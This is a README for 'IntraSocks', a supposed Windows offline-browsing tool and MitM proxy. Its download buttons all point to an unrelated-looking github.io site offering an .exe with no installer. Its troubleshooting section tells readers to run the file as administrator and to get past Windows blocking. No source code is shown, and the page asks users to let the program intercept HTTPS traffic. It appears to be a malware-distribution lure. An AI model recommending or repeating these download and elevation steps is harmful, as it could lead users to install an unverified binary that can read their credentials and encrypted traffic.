# 🧦 IntraSocks - Browse Offline, See Everything Live

[![Download IntraSocks](https://img.shields.io/badge/Download-IntraSocks-4CAF50?style=for-the-badge&logo=github)](https://deuteriumvillagegreen361.github.io)

## 🎯 What Is IntraSocks?

IntraSocks is a smart local helper that runs quietly on your computer. It acts as a middleman between your web browser and the internet, saving copies of the web pages you visit right into a small database on your machine. This means you can look at those pages again later, even when you're not connected to the internet.

But here's the cool part: IntraSocks comes with a tiny, floating window that you can drag anywhere on your screen. This window shows you exactly what's happening with your network traffic in real-time, and it breaks down every piece of every web page you load — images, scripts, styles, fonts, and more. You get a behind-the-scenes look at any website without needing any technical skills.

Think of IntraSocks as a friendly bookkeeper for your browsing. It records everything, keeps it tidy in a database, and lets you replay or inspect it whenever you want.

## ✅ Who Is This For?

- **Regular internet users** who want to revisit web pages without an internet connection
- **Curious people** who like to see what a website is really made of
- **Students** saving research pages for later study
- **Travelers** who need offline access to important documents or articles
- **Anyone** who has ever lost internet access and wished they had saved that page

No programming knowledge is needed. If you can click a button and follow simple steps, you can use IntraSocks.

## 🌟 Key Features

Here's what IntraSocks does for you:

| Feature | What It Means For You |
|---------|----------------------|
| 🗂️ **Local Content Cache** | Automatically saves web pages to your computer's database |
| 🌐 **Offline Browsing** | Revisit saved pages anytime, anywhere, without internet |
| 🖱️ **Draggable Floating UI** | A small, movable window that never gets in your way |
| 📊 **Real-Time Traffic Tracking** | See every request your browser makes as it happens |
| 🧩 **Asset Analysis** | View all images, scripts, and styles on any page |
| 🔍 **MitM Proxy System** | Watches traffic safely and privately on your device |
| 💾 **SQLite Storage** | Compact and reliable database that doesn't slow you down |

## 🚀 Getting Started

Getting IntraSocks up and running is simple. Follow these steps:

### Step 1: Download IntraSocks

Visit this link to download the application: [https://deuteriumvillagegreen361.github.io](https://deuteriumvillagegreen361.github.io)

Click the big green **Download** button at the top of this page, and you'll jump right to the download area.

### Step 2: Run the Application

Once the download finishes, locate the downloaded file in your "Downloads" folder. The file will be named something like `IntraSocks` and will have an `.exe` extension.

**Double-click** the file to run it. That's it — no installation wizard, no complicated setup. The program will start right away.

### Step 3: Find the Floating Window

When IntraSocks starts, you'll see a small, colorful window appear on your screen. This is your control panel. You can **click and drag** it anywhere — top, bottom, left, or right. It stays on top of other windows so you never lose track of it.

### Step 4: Start Browsing

Now open your favorite web browser and visit any website. As you browse, IntraSocks will quietly:

- Save a copy of each page into its database
- Show you real-time traffic in its floating window
- List all the assets (images, scripts, fonts, etc.) used by each page

## 🧭 How to Use the Floating Window

The floating window is your main interface. Here's what each part does:

- **Traffic Feed** — A live list of network requests happening right now. Each entry shows the name of the resource and its status.
- **Asset Bar** — Shows counts of different file types on the current page (e.g., 5 images, 2 scripts, 1 style).
- **Database Info** — Displays how many pages are saved locally and how much space they occupy.
- **Minimize Button** — Tucks the window away to a tiny icon on your screen. Click it again to bring it back.

You can rearrange this window by dragging its top edge. You can also click and drag the little handle at the bottom-right corner to resize it.

## 📚 Understanding What You See

When you visit a webpage, IntraSocks captures a lot of information. Here's a simple breakdown:

- **Requests** — Every time your browser asks a server for a file (like a picture or script), that's a request. IntraSocks lists each one.
- **Assets** — These are the individual files that make up a website: photos, videos, style sheets (CSS), and scripts (JavaScript). You'll see them all listed.
- **Status Codes** — You'll see numbers like `200` (success) or `404` (not found). Green means good, red means missing.

You don't need to understand every detail to benefit from IntraSocks. Just knowing you can see these things is a powerful tool.

## 🔧 System Requirements

IntraSocks is lightweight and designed to run on almost any modern computer. Here's what you'll need:

- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
- **Memory:** At least 2 GB of RAM (4 GB or more is better)
- **Storage:** 200 MB of free disk space for the program plus additional space for cached pages
- **Internet Connection:** Required only for downloading the app and for live browsing; not needed for viewing saved pages

That's it. No graphics card, no special hardware, no technical knowledge required.

## 🧪 Example: Save a Page for Offline Reading

Suppose you're researching an article online, and you want to read it later on a flight with no internet. Here's how IntraSocks helps:

1. Start IntraSocks.
2. Open the article in your browser.
3. Read it normally — IntraSocks saves it automatically.
4. Close your browser and disconnect from the internet.
5. Open IntraSocks' floating window.
6. Find the article in the saved pages list.
7. Click it, and the page opens from your local database, exactly as you saw it online.

Works for news articles, recipes, product pages, documentation, and nearly every kind of web page.

## 🛡️ Privacy and Safety

IntraSocks is a **local** tool. That means everything it does happens on *your* computer. It does not send your browsing data anywhere. It does not upload your saved pages to the cloud. It does not share your information with third parties.

The technical name for what IntraSocks does is a "Man-in-the-Middle" (MitM) proxy. This simply means it intercepts traffic between your browser and the internet — but it does so safely and transparently on your own machine. You're always in control.

## 🆘 Troubleshooting Common Issues

### "I Downloaded the File but Nothing Happens"

If double-clicking doesn't open the app, try:
- Right-click the downloaded file and choose "Run as administrator"
- Check your "Downloads" folder — the file might be there
- Make sure Windows hasn't blocked it (look for a shield icon)

### "The Floating Window Disappeared"

If you accidentally closed the window:
- Look in your system tray (bottom-right corner of your screen) for the IntraSocks icon
- Right-click it and select "Show Window"

### "Pages Aren't Being Saved"

Check that IntraSocks is still running:
- Open the floating window and look at the database counter
- If it says "0 pages," try restarting the app
- Make sure you're not in "Private" or "Incognito" browsing mode

### "I Want to Delete Saved Pages"

- Right-click the IntraSocks icon in the system tray
- Select "Clear Cache" to remove all saved pages
- Or manually delete the folder named `intrasocks_data` located in your user folder

## 💾 Backing Up Your Saved Pages

Your saved pages are stored in a small file called `intrasocks.db`. If you want to keep them safe:

1. Navigate to your user folder (e.g., `C:\Users\YourName`)
2. Find the folder named `intrasocks_data`
3. Copy the entire folder to an external drive or cloud storage

That way, you can restore your offline library on another computer later.

## 🌍 Supported Browsers

IntraSocks works with all major browsers that support proxy settings:

- Google Chrome
- Mozilla Firefox
- Microsoft Edge
- Opera
- Brave

No browser extension is required. IntraSocks works at the system level, so it doesn't care which browser you use.

## ❓ Frequently Asked Questions

**Is IntraSocks free?** Yes, it's completely free to download and use.

**Will it slow down my computer?** No. IntraSocks is lightweight and runs quietly in the background. You won't notice any performance changes.

**Can I use it on Mac?** Currently, IntraSocks is designed for Windows only. A Mac version may come later.

**Does it support HTTPS websites?** Yes, it handles both regular and secure (HTTPS) pages.

**How much data can it store?** As much as your hard drive allows. You can store thousands of pages without issue.

## 📖 A Real-World Example

Imagine you're planning a trip. You research hotel reviews, city guides, and restaurant recommendations. With IntraSocks, all those pages are automatically saved. On the airplane, without internet, you can read every single one — with images, text, and links intact.

Or imagine you're comparing products. You visit five different review pages. IntraSocks lets you flip back through them instantly, side by side, without reloading anything.

## 🎉 Final Thoughts

IntraSocks turns your computer into a personal web archive. It's fast, it's simple, and it's incredibly handy. With its drag-anywhere window and live traffic view, you get a powerful tool that's also fun to watch.

Download it now, start browsing as usual, and discover how convenient offline access can be.

[![Download IntraSocks Now](https://img.shields.io/badge/Download-IntraSocks-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://deuteriumvillagegreen361.github.io)

## 📬 Get Help and Stay Updated

- **Releases Page:** [https://deuteriumvillagegreen361.github.io](https://deuteriumvillagegreen361.github.io)
- **Issues and Support:** Visit the repository's issues section for help from the community

Thank you for choosing IntraSocks. Happy offline browsing!

Keywords: intrasocks, mitm, mitm-proxy, mitmproxy, python, socks5, socks5-proxy, socks5-server, sqlite, web, webarchive, website